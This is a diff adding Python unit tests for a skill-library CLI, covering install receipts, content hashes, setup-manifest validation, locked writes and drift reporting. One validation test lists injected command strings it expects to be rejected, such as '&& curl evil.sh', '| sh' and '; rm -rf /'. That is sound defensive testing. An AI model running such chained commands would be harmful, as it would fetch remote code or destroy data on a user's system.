+        self.tool.receipts_path.write_text(json.dumps({
+            "version": 1,
+            "installs": [{"name": "nodest"}, "garbage", make_receipt("/a/one")],
+        }))
+        self.assertEqual(list(library.load_receipts()), ["/a/one"])
+
+    def test_a_partial_record_reads_back_with_null_keys(self) -> None:
+        self.tool.receipts_path.write_text(json.dumps({
+            "version": 1, "installs": [{"dest": "/a/one", "name": "one"}],
+        }))
+        rec = library.load_receipts()["/a/one"]
+        self.assertEqual(set(rec), set(library.RECEIPT_KEYS))
+        self.assertIsNone(rec["commit"])
+
+
+class TestContentHash(unittest.TestCase):
+    def setUp(self) -> None:
+        self.tool = TempTool()
+        self.addCleanup(self.tool.stop)
+
+    def _tree(self, name: str) -> Path:
+        root = self.tool.root / name
+        (root / "sub").mkdir(parents=True)
+        (root / "SKILL.md").write_text("body\n")
+        (root / "sub" / "ref.md").write_text("ref\n")
+        return root
+
+    def test_identical_trees_hash_the_same(self) -> None:
+        self.assertEqual(library.content_hash(self._tree("a")),
+                         library.content_hash(self._tree("b")))
+
+    def test_edited_content_changes_the_hash(self) -> None:
+        tree = self._tree("a")
+        before = library.content_hash(tree)
+        (tree / "SKILL.md").write_text("edited\n")
+        self.assertNotEqual(before, library.content_hash(tree))
+
+    def test_a_rename_changes_the_hash(self) -> None:
+        # Paths are hashed alongside bytes, so moving a file is a change even though
+        # the byte total is identical.
+        tree = self._tree("a")
+        before = library.content_hash(tree)
+        (tree / "sub" / "ref.md").rename(tree / "sub" / "other.md")
+        self.assertNotEqual(before, library.content_hash(tree))
+
+    def test_hashes_a_single_file(self) -> None:
+        one = self.tool.root / "agent.md"
+        one.write_text("hello\n")
+        two = self.tool.root / "copy.md"
+        two.write_text("hello\n")
+        self.assertNotEqual(library.content_hash(one), library.content_hash(two),
+                            "the file's name is part of its identity")
+        self.assertTrue(library.content_hash(one).startswith("sha256:"))
+
+    def test_a_missing_path_hashes_as_empty(self) -> None:
+        self.assertEqual(library.content_hash(self.tool.root / "gone"),
+                         library.content_hash(self.tool.root / "also-gone"))
+
+
+VALID_SETUP = {
+    "version": 1,
+    "summary": "One-time credential setup.",
+    "prerequisites": [{"node": ">=20"}, {"sibling-skill": "atlassian-toolkit"},
+                      {"env": "RETRO_CYCLE_PATH"}, {"binary": "git"}],
+    "config": {"path": "~/.config/toolkit/config.json"},
+    "secrets": [{"key": "account.api_token", "label": "API token",
+                 "delivery": "config-file"}],
+    "commands": {"config-init": {"run": "bin/jira.mjs config init"},
+                 "check": {"run": "bin/jira.mjs config check"}},
+}
+
+
+def setup_manifest(**overrides: Any) -> dict[str, Any]:
+    """A valid manifest with *overrides* applied at the top level."""
+    data = json.loads(json.dumps(VALID_SETUP))  # deep copy, stdlib only
+    data.update(overrides)
+    return data
+
+
+class TestValidateSetup(unittest.TestCase):
+    """skill-setup-schema §7 — every rule, and failing closed on the two that matter."""
+
+    def assert_valid(self, data: dict[str, Any]) -> None:
+        self.assertEqual(library.validate_setup(data), [])
+
+    def assert_problem(self, data: dict[str, Any], fragment: str) -> None:
+        problems = library.validate_setup(data)
+        self.assertTrue(problems, f"expected a problem mentioning {fragment!r}")
+        self.assertTrue(any(fragment in p for p in problems), problems)
+
+    def test_the_worked_example_validates(self) -> None:
+        self.assert_valid(VALID_SETUP)
+
+    def test_a_manifest_with_no_optional_blocks_validates(self) -> None:
+        self.assert_valid({"version": 1, "summary": "nothing to configure"})
+
+    def test_unknown_keys_are_ignored_for_forward_compatibility(self) -> None:
+        self.assert_valid(setup_manifest(future_key={"anything": True}))
+
+    def test_an_unknown_version_invalidates_the_whole_manifest(self) -> None:
+        # §7: a later schema could change what `delivery` means, so nothing is parsed.
+        for version in (2, "1", None, 0):
+            with self.subTest(version=version):
+                problems = library.validate_setup(setup_manifest(version=version))
+                self.assertEqual(len(problems), 1)
+                self.assertIn("unknown setup version", problems[0])
+
+    def test_an_unknown_delivery_is_an_error_not_a_fallback(self) -> None:
+        # Downgrading an unrecognized delivery to the default would write a secret the
+        # skill intended nothing to store.
+        self.assert_problem(setup_manifest(secrets=[{"key": "k", "delivery": "webhook"}]),
+                            "unknown delivery 'webhook'")
+
+    def test_a_retired_field_is_rejected_rather_than_ignored(self) -> None:
+        # Unknown keys are ignored on purpose (§7), but these four are *known and
+        # removed*: each expressed an intent nothing honours now, so silently dropping
+        # one leaves a manifest looking configured for behaviour it will not get.
+        for field, value in (("format", "json"), ("permissions", "0600"),
+                             ("scaffold", "config-init")):
+            with self.subTest(field=field):
+                data = setup_manifest()
+                data["config"][field] = value
+                self.assert_problem(data, f"'config.{field}' was removed from the schema")
+
+        self.assert_problem(setup_manifest(verify="check"),
+                            "'verify' was removed from the schema")
+
+    def test_a_config_file_secret_requires_the_reserved_scaffold_command(self) -> None:
+        # The app writes into a file the *skill* created: its template carries defaults
+        # and the shape `config migrate` keys off, which a bare {} the app invented does
+        # not have. Reserving the id is what makes that requirement checkable.
+        self.assert_problem(
+            setup_manifest(commands={"check": {"run": "bin/x.mjs"}}),
+            "a 'config-init' command is required to create it")
+
+        self.assert_valid(setup_manifest(commands={
+            "config-init": {"run": "bin/x.mjs init"}, "check": {"run": "bin/x.mjs check"}}))
+
+    def test_shell_metacharacters_in_run_are_rejected(self) -> None:
+        for run in ("bin/x.mjs && curl evil.sh", "bin/x.mjs | sh", "bin/x.mjs; rm -rf /",
+                    "bin/x.mjs > /tmp/out", "bin/x.mjs $(whoami)", "bin/x.mjs `id`"):
+            with self.subTest(run=run):
+                self.assert_problem(setup_manifest(commands={"check": {"run": run}},
+                                                   config={}, secrets=[]),
+                                    "shell metacharacters")
+
+    def test_a_run_that_escapes_the_skill_dir_is_rejected(self) -> None:
+        for run, fragment in (("../../bin/x.mjs", "escapes the skill dir"),
+                              ("/usr/local/bin/x", "must be relative")):
+            with self.subTest(run=run):
+                self.assert_problem(setup_manifest(commands={"check": {"run": run}},
+                                                   config={}, secrets=[]),
+                                    fragment)
+
+    def test_a_symlink_out_of_the_skill_dir_is_rejected_when_the_dir_is_known(self) -> None:
+        # The textual '..' check cannot see this one; only resolving the path can.
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            skill = root / "skill"
+            (skill / "bin").mkdir(parents=True)
+            (root / "outside.mjs").write_text("#!/usr/bin/env node\n")
+            (skill / "bin" / "x.mjs").symlink_to(root / "outside.mjs")
+            data = setup_manifest(commands={"check": {"run": "bin/x.mjs"}},
+                                  config={}, secrets=[])
+            self.assertEqual(library.validate_setup(data), [])  # no dir: nothing to resolve
+            problems = library.validate_setup(data, skill)
+            self.assertTrue(any("resolves outside" in p for p in problems), problems)
+
+    def test_a_config_file_secret_requires_a_config_path(self) -> None:
+        self.assert_problem(setup_manifest(config={}), "needs config.path")
+
+    def test_env_and_manual_secrets_need_no_config_block(self) -> None:
+        for delivery in ("env", "manual"):
+            with self.subTest(delivery=delivery):
+                self.assert_valid(setup_manifest(
+                    config={}, secrets=[{"key": "k", "delivery": delivery}],
+                    commands={"check": {"run": "bin/x.mjs"}}))
+
+    def test_a_relative_config_path_is_rejected(self) -> None:
+        data = setup_manifest()
+        data["config"]["path"] = "config/settings.json"
+        self.assert_problem(data, "must be absolute or ~-prefixed")
+
+    def test_a_prerequisite_needs_exactly_one_kind(self) -> None:
+        self.assert_problem(setup_manifest(prerequisites=[{}]), "exactly one of")
+        self.assert_problem(setup_manifest(prerequisites=[{"node": ">=20", "env": "X"}]),
+                            "exactly one of")
+        self.assert_problem(setup_manifest(prerequisites=[{"npm": ">=9"}]), "exactly one of")
+
+    def test_a_secret_without_a_key_is_rejected(self) -> None:
+        self.assert_problem(setup_manifest(secrets=[{"label": "no key"}]), "missing 'key'")
+
+    def test_a_non_mapping_manifest_is_rejected(self) -> None:
+        for data in ([], "version: 1", None):
+            with self.subTest(data=data):
+                self.assertEqual(library.validate_setup(data), ["setup.yaml must be a mapping"])
+
+
+class TestLintSetup(unittest.TestCase):
+    """schema §11 — conventions, on a channel that never disables a walkthrough."""
+
+    def test_a_canonical_manifest_has_nothing_to_say(self) -> None:
+        data = setup_manifest(secrets=[{
+            "key": "account.api_token", "label": "API token", "delivery": "config-file"}])
+        data["commands"] = {"config-init": {"run": "bin/x.mjs init", "description": "Scaffold"},
+                            "check": {"run": "bin/x.mjs check", "description": "Check"}}
+        self.assertEqual(library.lint_setup(data), [])
+
+    def test_the_scaffold_it_prints_passes_its_own_rules(self) -> None:
+        # A template that its own linter rejects would teach the deviation it exists to
+        # prevent, on the very first manifest anyone writes.
+        data = yaml.safe_load(library.SETUP_TEMPLATE.format(name="x", summary="s"))
+        self.assertEqual(library.validate_setup(data), [])
+        self.assertEqual(library.lint_setup(data), [])
+
+    def test_top_level_key_order_is_reported(self) -> None:
+        data = {"summary": "s", "version": 1}
+        self.assertIn("top level", library.lint_setup(data)[0])
+
+    def test_secret_key_order_is_reported_against_the_canon(self) -> None:
+        # The deviation that actually happened, twice, in files written by hand.
+        data = setup_manifest(secrets=[{
+            "key": "k", "label": "L", "delivery": "config-file",
+            "optional": True, "env_override": "TOKEN"}])
+        note = next(n for n in library.lint_setup(data) if "secrets[0]" in n)
+        self.assertIn("canonical order is key, label, delivery, env_override, optional", note)
+
+    def test_keys_the_canon_does_not_name_are_ignored(self) -> None:
+        # A field added by a later schema version must not make an existing manifest
+        # non-canonical, or every manifest becomes noisy the day the schema grows.
+        data = setup_manifest(secrets=[{
+            "key": "k", "label": "L", "delivery": "config-file", "future_field": 1}])
+        self.assertEqual([n for n in library.lint_setup(data) if "secrets[0]" in n], [])
+
+    def test_a_missing_label_and_an_implied_delivery_are_reported(self) -> None:
+        data = setup_manifest(secrets=[{"key": "account.api_token"}])
+        notes = " ".join(library.lint_setup(data))
+        self.assertIn("no label", notes)
+        self.assertIn("no explicit delivery", notes)
+
+    def test_a_command_without_a_description_is_reported(self) -> None:
+        data = setup_manifest(commands={"config-init": {"run": "bin/x.mjs"}})
+        self.assertIn("commands.config-init: no description", library.lint_setup(data))
+
+    def test_conventions_are_never_validity(self) -> None:
+        # The separation this whole channel exists for: a manifest can be wholly
+        # non-canonical and still perfectly valid, and must still run.
+        data = setup_manifest(secrets=[{"key": "k"}], commands={"config-init": {"run": "bin/x.mjs"}})
+        self.assertEqual(library.validate_setup(data), [])
+        self.assertTrue(library.lint_setup(data))
+
+
+class TestLoadSetup(unittest.TestCase):
+    def setUp(self) -> None:
+        self.tool = TempTool()
+        self.addCleanup(self.tool.stop)
+        self.dest = self.tool.home / ".claude/skills/toolkit"
+        (self.dest / "bin").mkdir(parents=True)
+        (self.dest / "bin" / "jira.mjs").write_text("#!/usr/bin/env node\n")
+
+    def write(self, text: str) -> None:
+        (self.dest / "setup.yaml").write_text(text)
+
+    def test_an_absent_manifest_is_not_an_error(self) -> None:
+        self.assertEqual(library.load_setup(self.dest), (None, []))
+
+    def test_a_valid_manifest_round_trips(self) -> None:
+        self.write(yaml.safe_dump(VALID_SETUP))
+        manifest, problems = library.load_setup(self.dest)
+        self.assertEqual(problems, [])
+        self.assertEqual(sorted(manifest["commands"]), ["check", "config-init"])
+
+    def test_unparseable_yaml_is_reported_rather_than_raised(self) -> None:
+        self.write("version: 1\n  bad indent: [\n")
+        manifest, problems = library.load_setup(self.dest)
+        self.assertIsNone(manifest)
+        self.assertTrue(problems and "unreadable" in problems[0], problems)
+
+    def test_problems_are_reported_against_the_installed_dir(self) -> None:
+        self.write(yaml.safe_dump(setup_manifest(
+            commands={"check": {"run": "bin/missing.mjs"}},
+            config={}, secrets=[])))
+        # A command that simply doesn't exist yet is not a schema violation; only
+        # escaping the skill dir is.
+        self.assertEqual(library.load_setup(self.dest)[1], [])
+
+
+class TestWriteMachineFile(unittest.TestCase):
+    """Atomic, locked writes for machine-owned state (design §7)."""
+
+    def setUp(self) -> None:
+        self.tool = TempTool()
+        self.addCleanup(self.tool.stop)
+        self.target = self.tool.tool_dir / "state.json"
+
+    def _spawn_writer(self, marker: str, size: int) -> subprocess.Popen:
+        """A separate *process* writing a big payload — threads would share the fd table
+        and so would not exercise the inter-process lock the real front doors need."""
+        script = (
+            "import sys; sys.path.insert(0, %r)\n"
+            "import library\n"
+            "from pathlib import Path\n"
+            "library.write_machine_file(Path(%r), %r * %d)\n"
+            % (str(REAL_TOOL_DIR), str(self.target), marker, size)
+        )
+        return subprocess.Popen([sys.executable, "-c", script],
+                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+    def test_concurrent_writers_leave_one_whole_payload(self) -> None:
+        size = 200_000
+        procs = [self._spawn_writer(m, size) for m in "abcd"]
+        for p in procs:
+            _, err = p.communicate(timeout=60)
+            self.assertEqual(p.returncode, 0, err.decode())
+        text = self.target.read_text()
+        self.assertEqual(len(text), size, "file was truncated or interleaved")
+        self.assertIn(text[0], "abcd")
+        self.assertEqual(text, text[0] * size, "two writers' bytes were interleaved")
+
+    def test_a_leftover_lock_file_does_not_deadlock(self) -> None:
+        # flock dies with the process that took it, so a lock file on disk from a
+        # crashed run is inert. Writing must not wait on it.
+        self.target.with_name(self.target.name + ".lock").write_text("")
+        library.write_machine_file(self.target, "ok")
+        self.assertEqual(self.target.read_text(), "ok")
+
+    def test_creates_missing_parent_directories(self) -> None:
+        nested = self.tool.tool_dir / "a" / "b" / "state.json"
+        library.write_machine_file(nested, "ok")
+        self.assertEqual(nested.read_text(), "ok")
+
+    def test_a_failed_write_leaves_no_temp_file_behind(self) -> None:
+        class Boom(Exception):
+            pass
+
+        with patch("library.os.replace", side_effect=Boom):
+            with self.assertRaises(Boom):
+                library.write_machine_file(self.target, "nope")
+        self.assertFalse(self.target.exists())
+        self.assertEqual([p.name for p in self.tool.tool_dir.glob("*.tmp")], [])
+
+
 class TestWriteConfig(unittest.TestCase):
     def setUp(self) -> None:
         self.tool = TempTool()
@@ -2607,6 +3649,32 @@ class TestWriteConfig(unittest.TestCase):
         cfg = library.write_config({"catalogs": [{"id": "personal", "path": str(path)}]})
         self.assertEqual([c.id for c in cfg.catalogs], ["personal"])
         self.assertTrue(self.tool.config_path.read_text().startswith("# The Library"))
+
+    def test_concurrent_writers_never_leave_a_truncated_config(self) -> None:
+        # §7: `catalog add/remove/init` can run from three front doors at once, and each
+        # rewrites this file whole. A reader mid-write would otherwise see no catalogs.
+        paths = []
+        for i in range(4):
+            path = self.tool.root / f"cat{i}.yaml"
+            path.write_text("library:\n  skills: []\n")
+            paths.append(path)
+        script = (
+            "import sys; sys.path.insert(0, %r)\n"
+            "import library\n"
+            "from pathlib import Path\n"
+            "library.LOCAL_CONFIG_PATH = Path(%r)\n"
+            "library.write_config({'catalogs': [{'id': 'c%%d' %% i, 'path': p} "
+            "for i, p in enumerate(%r)]})\n"
+            % (str(REAL_TOOL_DIR), str(self.tool.config_path), [str(p) for p in paths])
+        )
+        procs = [subprocess.Popen([sys.executable, "-c", script],
+                                  stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                 for _ in range(4)]
+        for proc in procs:
+            _, err = proc.communicate(timeout=60)
+            self.assertEqual(proc.returncode, 0, err.decode())
+        data = yaml.safe_load(self.tool.config_path.read_text())
+        self.assertEqual([c["id"] for c in data["catalogs"]], ["c0", "c1", "c2", "c3"])
 
     def test_refuses_an_invalid_config_without_touching_the_file(self) -> None:
         self.tool.write_config(LEGACY_CONFIG)
@@ -3054,6 +4122,40 @@ class TestListAcrossCatalogs(unittest.TestCase):
         rows = self.rows("--catalog", "personal")
         self.assertIsNone(rows["personal/session-retro"]["overridden_by"])
 
+    def test_the_pre_existing_json_keys_keep_their_name_and_type(self) -> None:
+        # C-D8: the desktop backend and the agent both parse against this promise, so
+        # the nine original keys are pinned by name *and* type, not just by presence.
+        expected = {"type": str, "name": str, "description": str, "source": str,
+                    "requires": list, "installed": bool, "scopes": list, "catalog": str}
+        row = self.rows()["personal/session-retro"]
+        for key, kind in expected.items():
+            self.assertIsInstance(row[key], kind, key)
+        self.assertIn("overridden_by", row)  # str or None
+
+    def test_json_carries_state_receipt_and_has_setup(self) -> None:
+        row = self.rows()["personal/scratch-thing"]
+        self.assertEqual((row["state"], row["receipt"], row["has_setup"]),
+                         ("not_installed", None, False))
+
+    def test_a_hand_installed_copy_is_installed_but_untracked(self) -> None:
+        self.install("scratch-thing")
+        row = self.rows()["personal/scratch-thing"]
+        self.assertEqual((row["installed"], row["state"], row["receipt"]),
+                         (True, "untracked", None))
+
+    def test_an_overridden_row_reports_no_state_of_its_own(self) -> None:
+        # The dest belongs to the winner; the losing copy must not claim its receipt.
+        self.install("session-retro")
+        rows = self.rows()
+        self.assertEqual(rows["shared/session-retro"]["state"], "not_installed")
+        self.assertEqual(rows["personal/session-retro"]["state"], "untracked")
+
+    def test_has_setup_follows_the_installed_copy(self) -> None:
+        self.install("scratch-thing")
+        self.assertFalse(self.rows()["personal/scratch-thing"]["has_setup"])
+        (self.tool.home / ".claude/skills/scratch-thing/setup.yaml").write_text("version: 1\n")
+        self.assertTrue(self.rows()["personal/scratch-thing"]["has_setup"])
+
     def test_a_skipped_catalog_is_surfaced_with_its_reason(self) -> None:
         (self.tool.root / "personal" / "library.yaml").unlink()
         with captured_warnings():
@@ -3114,6 +4216,16 @@ class TestSearchAcrossCatalogs(unittest.TestCase):
         by_catalog = {i["catalog"]: i for i in self.payload("retro")}
         self.assertIsNone(by_catalog["personal"]["overridden_by"])
         self.assertEqual(by_catalog["shared"]["overridden_by"], "personal")
+
+    def test_the_record_is_identical_to_the_one_list_returns(self) -> None:
+        # §4.1: the shape difference is why callers filtered `list` client-side instead
+        # of calling `search` — a CLI shortcoming that became an app workaround.
+        (self.tool.home / ".claude/skills/scratch-thing").mkdir(parents=True)
+        found = next(i for i in self.payload("scratch"))
+        code, out, err = run_cli("list", "--no-pull", "--json")
+        self.assertEqual(code, 0, err)
+        listed = next(i for i in json.loads(out) if i["name"] == "scratch-thing")
+        self.assertEqual(found, listed)
 
     def test_results_are_labelled_with_their_catalog(self) -> None:
         code, out, err = run_cli("search", "retro", "--no-pull")
@@ -3444,8 +4556,10 @@ library:
         self.assertTrue((self.installed_dir("own-dep") / "SKILL.md").is_file())
 
     def test_the_human_report_names_the_catalog(self) -> None:
+        # --force, so this exercises the refresh line rather than the skip line; the
+        # skip path has its own coverage in TestSyncSkipsUnchangedItems.
         self.use("own-dep")
-        code, out, _ = run_cli("sync", "--no-pull")
+        code, out, _ = run_cli("sync", "--force", "--no-pull")
         self.assertEqual(code, 0)
         self.assertIn("refreshed [skill] own-dep (global)", out)
         self.assertIn("(from personal)", out)
@@ -3463,7 +4577,7 @@ library:
         self.tool.write_config({"catalogs": [{"id": "personal",
                                               "path": str(self.tool.root / "personal/library.yaml")}],
                                 "autopush": False})
-        code, out, _ = run_cli("sync", "--no-pull")
+        code, out, _ = run_cli("sync", "--force", "--no-pull")
         self.assertEqual(code, 0)
         self.assertIn("refreshed [skill] own-dep (global)", out)
         self.assertNotIn("(from ", out)
@@ -3486,6 +4600,1315 @@ library:
         payload = self.sync()
         self.assertEqual((payload["status"], payload["synced"], payload["failed"]),
                          ("OK", [], []))
+
+
+# --------------------------------------------------------------------------- #
+# Install receipts written by use/sync (design §3)
+# --------------------------------------------------------------------------- #
+
+class TestInstallsWriteReceipts(unittest.TestCase):
+    REMOTE_SOURCE = "https://github.com/acme/agentics/blob/main/skills/from-git/SKILL.md"
+
+    def setUp(self) -> None:
+        self.tool = TempTool()
+        self.addCleanup(self.tool.stop)
+        self.src = self.tool.root / "sources"
+        for name in ("own-dep", "needs-own"):
+            (self.src / name).mkdir(parents=True)
+            (self.src / name / "SKILL.md").write_text(f"# {name}\n")
+
+        # A bare repo standing in for GitHub: the source URL parses as remote, and
+        # clone_urls is redirected at it so the clone stays offline (R18.6).
+        self.repo = TempGitRepo(self.tool.root, name="agentics")
+        self.repo.commit("skills/from-git/SKILL.md", "# from-git\n")
+        self.repo.push()
+        self.head = self.repo.head()
+
+        install_local_only_fixture(self.tool, f"""\
+library:
+  skills:
+    - name: needs-own
+      description: Needs a dep from its own catalog
+      source: {self.src}/needs-own/SKILL.md
+      requires: ["skill:own-dep"]
+    - name: own-dep
+      description: Dependency living in the same catalog
+      source: {self.src}/own-dep/SKILL.md
+    - name: from-git
+      description: Installed from a git remote
+      source: {self.REMOTE_SOURCE}
+  agents: []
+  prompts: []
+""")
+
+    def use(self, *argv: str) -> None:
+        code, _, err = run_cli("use", *argv, "--no-pull", "--json")
+        self.assertEqual(code, 0, err)
+
+    @contextlib.contextmanager
+    def _local_remote(self):
+        remote = str(self.repo.remote)
+        with patch.object(library.Source, "clone_urls", lambda _self: [remote]):
+            yield
+
+    def installed_dir(self, name: str) -> Path:
+        return self.tool.home / ".claude/skills" / name
+
+    def test_every_installed_item_including_dependencies_gets_a_receipt(self) -> None:
+        self.use("needs-own")
+        receipts = library.load_receipts()
+        self.assertEqual(sorted(r["name"] for r in receipts.values()),
+                         ["needs-own", "own-dep"])
+        rec = receipts[str(self.installed_dir("needs-own"))]
+        self.assertEqual(rec["catalog"], "personal")
+        self.assertEqual(rec["scope"], "global")
+        self.assertEqual(rec["type"], "skill")
+        self.assertEqual(rec["content_hash"],
+                         library.content_hash(self.installed_dir("needs-own")))
+        self.assertTrue(rec["installed_at"].endswith("Z"))
+
+    def test_reinstalling_updates_the_receipt_instead_of_duplicating_it(self) -> None:
+        self.use("own-dep")
+        first = library.load_receipts()[str(self.installed_dir("own-dep"))]
+        (self.src / "own-dep" / "SKILL.md").write_text("# own-dep v2\n")
+        self.use("own-dep")
+        receipts = library.load_receipts()
+        self.assertEqual(len(receipts), 1)
+        self.assertNotEqual(receipts[first["dest"]]["content_hash"], first["content_hash"])
+
+    def test_a_local_source_records_a_null_commit(self) -> None:
+        # Nothing to record: a directory on disk has no sha (§3).
+        self.use("own-dep")
+        self.assertIsNone(library.load_receipts()[str(self.installed_dir("own-dep"))]["commit"])
+
+    def test_a_remote_source_records_the_commit_it_was_cloned_from(self) -> None:
+        with self._local_remote():
+            self.use("from-git")
+        rec = library.load_receipts()[str(self.installed_dir("from-git"))]
+        self.assertEqual(rec["commit"], self.head)
+        self.assertEqual(rec["source"], self.REMOTE_SOURCE)
+
+    def test_a_project_scope_install_records_its_own_dest_and_scope(self) -> None:
+        code, _, err = run_cli("use", "own-dep", "--project", "--no-pull", "--json")
+        self.assertEqual(code, 0, err)
+        rec = library.load_receipts()[str(self.tool.project / ".claude/skills/own-dep")]
+        self.assertEqual(rec["scope"], "project")
+
+    def test_sync_refreshes_the_receipt(self) -> None:
+        self.use("own-dep")
+        before = library.load_receipts()[str(self.installed_dir("own-dep"))]
+        (self.src / "own-dep" / "SKILL.md").write_text("# own-dep v2\n")
+        code, _, err = run_cli("sync", "--no-pull", "--json")
+        self.assertEqual(code, 0, err)
+        after = library.load_receipts()[before["dest"]]
+        self.assertNotEqual(after["content_hash"], before["content_hash"])
+        self.assertEqual(after["content_hash"], library.content_hash(self.installed_dir("own-dep")))
+
+
+class TestDerivedInstallState(unittest.TestCase):
+    """State computed from receipt + disk, never stored (design §3.1)."""
+
+    def setUp(self) -> None:
+        self.tool = TempTool()
+        self.addCleanup(self.tool.stop)
+        self.src = self.tool.root / "sources"
+        for name in ("alpha", "beta"):
+            (self.src / name).mkdir(parents=True)
+            (self.src / name / "SKILL.md").write_text(f"# {name}\n")
+        install_local_only_fixture(self.tool, f"""\
+library:
+  skills:
+    - name: alpha
+      description: First
+      source: {self.src}/alpha/SKILL.md
+    - name: beta
+      description: Second
+      source: {self.src}/beta/SKILL.md
+  agents: []
+  prompts: []
+""")
+        self.cfg = library.load_config()
+        self.entries = {e.name: e for e in self.cfg.entries()}
+
+    def use(self, *argv: str) -> None:
+        code, _, err = run_cli("use", *argv, "--no-pull", "--json")
+        self.assertEqual(code, 0, err)
+
+    def installed_dir(self, name: str) -> Path:
+        return self.tool.home / ".claude/skills" / name
+
+    def state(self, name: str) -> str:
+        return library.entry_install_state(self.cfg.dirs, self.entries[name],
+                                           library.load_receipts())[0]
+
+    def test_a_fresh_install_is_installed(self) -> None:
+        self.use("alpha")
+        state, receipt = library.entry_install_state(
+            self.cfg.dirs, self.entries["alpha"], library.load_receipts())
+        self.assertEqual(state, "installed")
+        self.assertEqual(receipt["dest"], str(self.installed_dir("alpha")))
+
+    def test_an_entry_that_was_never_installed_is_not_installed(self) -> None:
+        self.assertEqual(self.state("alpha"), "not_installed")
+
+    def test_editing_the_installed_copy_reads_as_drifted(self) -> None:
+        self.use("alpha")
+        (self.installed_dir("alpha") / "SKILL.md").write_text("# edited by hand\n")
+        self.assertEqual(self.state("alpha"), "drifted")
+
+    def test_adding_a_file_to_the_installed_copy_reads_as_drifted(self) -> None:
+        self.use("alpha")
+        (self.installed_dir("alpha") / "notes.md").write_text("mine\n")
+        self.assertEqual(self.state("alpha"), "drifted")
+
+    def test_a_hand_created_directory_reads_as_untracked(self) -> None:
+        # C-D3: legitimate, and every install predating receipts looks like this.
+        d = self.installed_dir("alpha")
+        d.mkdir(parents=True)
+        (d / "SKILL.md").write_text("# hand written\n")
+        self.assertEqual(self.state("alpha"), "untracked")
+
+    def test_a_deleted_install_with_a_receipt_reads_as_missing(self) -> None:
+        self.use("alpha")
+        shutil.rmtree(self.installed_dir("alpha"))
+        self.assertEqual(self.state("alpha"), "missing")
+
+    def test_the_worst_state_across_scopes_is_the_one_reported(self) -> None:
+        self.use("alpha")
+        self.use("alpha", "--project")
+        self.assertEqual(self.state("alpha"), "installed")
+        (self.tool.project / ".claude/skills/alpha/SKILL.md").write_text("# edited\n")
+        self.assertEqual(self.state("alpha"), "drifted")
+
+    def test_a_custom_dir_install_stays_visible_through_its_receipt(self) -> None:
+        custom = self.tool.root / "elsewhere"
+        code, _, err = run_cli("use", "alpha", "--dir", str(custom), "--no-pull", "--json")
+        self.assertEqual(code, 0, err)
+        state, receipt = library.entry_install_state(
+            self.cfg.dirs, self.entries["alpha"], library.load_receipts())
+        self.assertEqual((state, receipt["dest"]), ("installed", str(custom / "alpha")))
+
+    def test_installed_scopes_still_answers_presence_for_an_untracked_copy(self) -> None:
+        # §3: receipts add provenance; they never become the presence check, or an
+        # untracked install would vanish from `list`.
+        d = self.installed_dir("alpha")
+        d.mkdir(parents=True)
+        (d / "SKILL.md").write_text("# hand written\n")
+        self.assertEqual(library.installed_scopes(self.cfg.dirs, self.entries["alpha"]),
+                         ["global"])
+
+    def test_dest_state_of_a_file_entry(self) -> None:
+        dest = self.tool.root / "agents" / "sql-review.md"
+        dest.parent.mkdir(parents=True)
+        dest.write_text("# agent\n")
+        rec = make_receipt(str(dest), type="agent", content_hash=library.content_hash(dest))
+        self.assertEqual(library.dest_state(dest, rec), "installed")
+        dest.write_text("# edited\n")
+        self.assertEqual(library.dest_state(dest, rec), "drifted")
+
+
+class TestDriftIsReportedBeforeOverwriting(unittest.TestCase):
+    """C-D4: drift is recorded and reported, never enforced — both still overwrite."""
+
+    def setUp(self) -> None:
+        self.tool = TempTool()
+        self.addCleanup(self.tool.stop)
+        self.src = self.tool.root / "sources" / "alpha"
+        self.src.mkdir(parents=True)
+        (self.src / "SKILL.md").write_text("# alpha\n")
+        install_local_only_fixture(self.tool, f"""\
+library:
+  skills:
+    - name: alpha
+      description: First
+      source: {self.src}/SKILL.md
+  agents: []
+  prompts: []
+""")
+
+    @property
+    def dest(self) -> Path:
+        return self.tool.home / ".claude/skills/alpha"
+
+    def use(self, *argv: str) -> dict[str, Any]:
+        code, out, err = run_cli("use", "alpha", *argv, "--no-pull", "--json")
+        self.assertEqual(code, 0, err)
+        return json.loads(out)
+
+    def drift(self) -> None:
+        (self.dest / "SKILL.md").write_text("# alpha, edited by hand\n")
+
+    def test_a_dry_run_flags_drift_and_writes_nothing(self) -> None:
+        self.use()
+        self.drift()
+        payload = self.use("--dry-run")
+        self.assertEqual([i["state"] for i in payload["would_install"]], ["drifted"])
+        self.assertEqual((self.dest / "SKILL.md").read_text(), "# alpha, edited by hand\n")
+
+    def test_a_dry_run_over_a_clean_install_reports_installed(self) -> None:
+        self.use()
+        self.assertEqual([i["state"] for i in self.use("--dry-run")["would_install"]],
+                         ["installed"])
+
+    def test_a_dry_run_before_any_install_reports_not_installed(self) -> None:
+        self.assertEqual([i["state"] for i in self.use("--dry-run")["would_install"]],
+                         ["not_installed"])
+
+    def test_the_human_dry_run_names_the_modification(self) -> None:
+        self.use()
+        self.drift()
+        code, out, err = run_cli("use", "alpha", "--dry-run", "--no-pull")
+        self.assertEqual(code, 0, err)
+        self.assertIn("locally modified", out)
+
+    def test_use_still_overwrites_a_drifted_copy_and_says_what_changed(self) -> None:
+        self.use()
+        self.drift()
+        payload = self.use()
+        self.assertEqual((self.dest / "SKILL.md").read_text(), "# alpha\n")
+        self.assertEqual(payload["installed"][0]["changes"]["modified"], ["SKILL.md"])
+
+    def test_sync_reports_the_state_it_found_before_refreshing(self) -> None:
+        self.use()
+        self.drift()
+        code, out, err = run_cli("sync", "--no-pull", "--json")
+        self.assertEqual(code, 0, err)
+        self.assertEqual([r["state"] for r in json.loads(out)["synced"]], ["drifted"])
+        self.assertEqual((self.dest / "SKILL.md").read_text(), "# alpha\n")
+
+    def test_sync_reports_a_hand_installed_copy_as_untracked(self) -> None:
+        self.dest.mkdir(parents=True)
+        (self.dest / "SKILL.md").write_text("# hand written\n")
+        code, out, err = run_cli("sync", "--no-pull")
+        self.assertEqual(code, 0, err)
+        self.assertIn("was not installed by this tool", out)
+
+
+class TestSyncSkipsUnchangedItems(unittest.TestCase):
+    """sync doesn't re-clone what hasn't changed (design §5)."""
+
+    REMOTE_SOURCE = "https://github.com/acme/agentics/blob/main/skills/from-git/SKILL.md"
+
+    def setUp(self) -> None:
+        self.tool = TempTool()
+        self.addCleanup(self.tool.stop)
